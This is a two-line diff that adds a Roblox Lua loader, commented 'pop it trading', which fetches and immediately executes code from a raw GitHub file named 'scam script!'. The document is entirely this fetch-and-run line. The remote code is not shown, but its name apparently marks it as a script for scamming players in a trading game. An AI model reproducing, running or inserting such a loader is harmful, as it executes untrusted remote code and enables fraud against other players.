@@ -1,0 +1,2 @@
+--//pop it trading =
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kevinagustotamba/dadad/main/scam%20script!"))()
